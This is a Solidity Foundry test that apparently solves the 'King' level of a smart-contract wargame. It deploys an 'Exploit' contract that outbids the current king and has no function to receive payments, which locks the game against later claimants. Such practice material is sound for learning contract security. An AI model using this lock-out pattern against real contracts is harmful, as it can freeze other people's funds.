// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/King.sol";
import "../src/levels/KingFactory.sol";
import "./utils/BaseTest.sol";

contract TestKing is BaseTest{
    King level;

    constructor() public{
        levelFactory = new KingFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);

        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        
        Exploit exploiter = new Exploit{value:level.prize()+1}(payable(address(level)));
        assertEq(level._king(),address(exploiter));

        vm.stopPrank();
    }
}

contract Exploit{
    constructor(address payable _contract) payable public{
        (bool success,) = address(_contract).call{value:msg.value}("");
        require(success,"eth transfer failed");
    }
}